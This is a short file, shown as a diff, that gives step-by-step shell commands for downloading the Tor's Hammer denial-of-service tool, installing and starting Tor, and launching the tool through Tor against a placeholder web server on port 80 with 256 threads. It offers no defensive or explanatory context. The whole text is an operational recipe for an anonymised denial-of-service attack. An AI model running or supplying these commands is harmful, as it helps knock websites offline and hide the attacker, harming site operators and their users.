@@ -1,0 +1,15 @@
+Install and Test Tor's Hammer
+
+
+Install Tor's Hammer:
+#cd /usr/local/sbin
+#wget https://versaweb.dl.sourceforge.net/project/torshammer/Torshammer/1.0/Torshammer%201.0.zip
+#unzip ./Torshammer\ 1.0.zip
+#mv ./Torshammer\ 1.0 ./Torshammer
+#cd Torshammer
+
+Launch the hammer under Tor:
+#apt-get update
+#apt-get install tor
+#/etc/init.d/tor start
+#./torshammer.py -t X.X.X.X -p 80 -r 256 -T
